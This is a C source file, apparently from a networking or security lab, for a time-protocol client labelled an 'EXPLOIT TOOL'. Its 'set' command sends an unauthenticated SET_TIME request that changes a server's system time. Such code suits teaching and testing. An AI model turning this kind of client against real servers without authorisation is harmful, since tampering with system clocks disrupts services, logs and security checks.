#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "protocol.h"

void print_time(uint32_t timestamp) {
    time_t t = (time_t)timestamp;
    struct tm *tm_info = localtime(&t);
    char buffer[26];
    strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
    printf("  Time: %s (Unix: %u)\n", buffer, timestamp);
}

int send_command(const char *server_ip, uint8_t command, uint32_t timestamp) {
    int sock_fd;
    struct sockaddr_in server_addr;
    message_header_t header;
    response_message_t response;
    
    // Create socket
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        perror("socket() failed");
        return -1;
    }
    
    // Connect to server
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TIMESERVER_PORT);
    inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
    
    if (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect() failed");
        close(sock_fd);
        return -1;
    }
    
    printf("Connected to %s:%d\n\n", server_ip, TIMESERVER_PORT);
    
    // Send request based on command
    if (command == CMD_GET_TIME) {
        // GET_TIME: just send header
        init_request_header(&header, CMD_GET_TIME, 0);
        
        if (write(sock_fd, &header, sizeof(header)) < 0) {
            perror("write() failed");
            close(sock_fd);
            return -1;
        }
    } 
    else if (command == CMD_SET_TIME) {
        // SET_TIME: send header + payload
        init_request_header(&header, CMD_SET_TIME, sizeof(set_time_payload_t));
        
        if (write(sock_fd, &header, sizeof(header)) < 0) {
            perror("write() failed");
            close(sock_fd);
            return -1;
        }
        
        set_time_payload_t payload;
        payload.new_timestamp = htonl(timestamp);
        
        if (write(sock_fd, &payload, sizeof(payload)) < 0) {
            perror("write() failed");
            close(sock_fd);
            return -1;
        }
        
        printf("⚠️  Sent SET_TIME command (EXPLOITING VULNERABILITY!)\n");
        print_time(timestamp);
        printf("\n");
    }
    
    // Read response
    ssize_t bytes = read(sock_fd, &response, sizeof(response));
    if (bytes < 0) {
        perror("read() failed");
        close(sock_fd);
        return -1;
    }
    
    if (bytes < (ssize_t)sizeof(response)) {
        printf("Incomplete response (%zd bytes)\n", bytes);
        close(sock_fd);
        return -1;
    }
    
    // Validate response header
    int validation = validate_header(&response.header);
    if (validation != RESP_OK) {
        printf("✗ Invalid response header\n");
        close(sock_fd);
        return -1;
    }
    
    // Parse response
    if (response.status == RESP_OK) {
        uint32_t resp_timestamp = ntohl(response.timestamp);
        printf("✓ Success!\n");
        print_time(resp_timestamp);
    } else if (response.status == RESP_ERROR) {
        printf("✗ Server returned error\n");
    } else if (response.status == RESP_UNAUTHORIZED) {
        printf("✗ Unauthorized\n");
    } else {
        printf("✗ Unknown status: 0x%02x\n", response.status);
    }
    
    close(sock_fd);
    return (response.status == RESP_OK) ? 0 : -1;
}

void print_usage(const char *prog) {
    printf("Usage:\n");
    printf("  %s get [server_ip]              - Get server time\n", prog);
    printf("  %s set <timestamp> [server_ip]  - Set server time (EXPLOITS VULNERABILITY!)\n", prog);
    printf("\n");
    printf("Examples:\n");
    printf("  %s get\n", prog);
    printf("  %s get 192.168.1.168\n", prog);
    printf("  %s set 1704067200               # Set to Jan 1, 2024\n", prog);
    printf("  %s set 1704067200 192.168.1.168\n", prog);
    printf("\n");
    printf("Generate timestamp:\n");
    printf("  date -d '2024-01-01' +%%s        # Linux\n");
    printf("  date -j -f '%%Y-%%m-%%d' 2024-01-01 +%%s  # macOS\n");
}

int main(int argc, char *argv[]) {
    char *server_ip = "127.0.0.1";
    
    printf("╔═══════════════════════════════════════════════════╗\n");
    printf("║  Bell Labs Time Client v0.4 - EXPLOIT TOOL       ║\n");
    printf("╚═══════════════════════════════════════════════════╝\n");
    printf("\n");
    
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }
    
    if (strcmp(argv[1], "get") == 0) {
        if (argc > 2) {
            server_ip = argv[2];
        }
        printf("Querying time from %s...\n", server_ip);
        return send_command(server_ip, CMD_GET_TIME, 0);
    }
    else if (strcmp(argv[1], "set") == 0) {
        if (argc < 3) {
            printf("Error: timestamp required for 'set' command\n\n");
            print_usage(argv[0]);
            return 1;
        }
        
        uint32_t timestamp = (uint32_t)strtoul(argv[2], NULL, 10);
        if (argc > 3) {
            server_ip = argv[3];
        }
        
        printf("⚠️  WARNING: Attempting to exploit server vulnerability!\n");
        printf("⚠️  This will change the server's system time!\n");
        printf("Target: %s\n\n", server_ip);
        
        return send_command(server_ip, CMD_SET_TIME, timestamp);
    }
    else {
        printf("Error: unknown command '%s'\n\n", argv[1]);
        print_usage(argv[0]);
        return 1;
    }
}
